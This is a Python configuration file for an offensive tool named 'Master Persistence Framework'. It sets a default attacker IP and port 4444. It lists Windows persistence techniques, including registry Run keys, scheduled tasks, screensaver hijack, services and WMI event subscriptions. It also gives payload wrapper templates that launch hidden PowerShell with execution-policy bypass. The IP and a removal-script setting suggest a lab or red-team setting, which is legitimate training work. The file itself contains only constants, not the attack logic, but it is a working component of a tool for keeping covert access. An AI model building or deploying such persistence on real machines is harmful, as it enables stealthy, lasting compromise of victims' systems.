"""
Configuration and constants for Master Persistence Framework
"""

# Default network settings
DEFAULT_ATTACKER_IP = '10.10.14.5'
DEFAULT_ATTACKER_PORT = 4444

# Persistence method definitions
PERSISTENCE_METHODS = {
    'registry_run_user': {
        'name': 'Registry Run Key (User)',
        'requires_admin': False,
        'priority': 1,
        'module': 'registry_persistence',
        'description': 'HKCU Run key - triggers on user logon'
    },
    'registry_run_machine': {
        'name': 'Registry Run Key (Machine)',
        'requires_admin': True,
        'priority': 2,
        'module': 'registry_persistence',
        'description': 'HKLM Run key - triggers on user logon (system-wide)'
    },
    'schtask_logon': {
        'name': 'Scheduled Task (Logon)',
        'requires_admin': False,
        'priority': 3,
        'module': 'scheduled_task_persistence',
        'description': 'Task triggers on user logon'
    },
    'schtask_periodic': {
        'name': 'Scheduled Task (Periodic)',
        'requires_admin': False,
        'priority': 4,
        'module': 'scheduled_task_persistence',
        'description': 'Task triggers every 30 minutes',
        'interval_minutes': 30
    },
    'screensaver': {
        'name': 'Screensaver Hijack',
        'requires_admin': False,
        'priority': 5,
        'module': 'registry_persistence',
        'description': 'Executes when screensaver activates'
    },
    'service': {
        'name': 'Windows Service',
        'requires_admin': True,
        'priority': 6,
        'module': 'service_persistence',
        'description': 'Runs at system startup'
    },
    'wmi_event': {
        'name': 'WMI Event Subscription',
        'requires_admin': True,
        'priority': 7,
        'module': 'wmi_persistence',
        'description': 'Triggers every 60 seconds or on event'
    }
}

# Payload wrapper templates
PAYLOAD_WRAPPERS = {
    'powershell_hidden': 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File "{payload_path}"',
    'cmd_hidden': 'cmd.exe /c start /min "" "{payload_path}"',
    'direct': '{payload_path}'
}

# Output file naming
REMOVAL_SCRIPT_PREFIX = 'remove_all_persistence'
REMOVAL_SCRIPT_EXTENSION = '.bat'

# Testing instructions
TESTING_INSTRUCTIONS = {
    'run_key': 'Triggers on user logon',
    'scheduled_task': 'Triggers based on schedule or event',
    'service': 'Runs at system startup',
    'wmi': 'Triggers every 60 seconds or on event',
    'screensaver': 'Triggers when screensaver activates'
}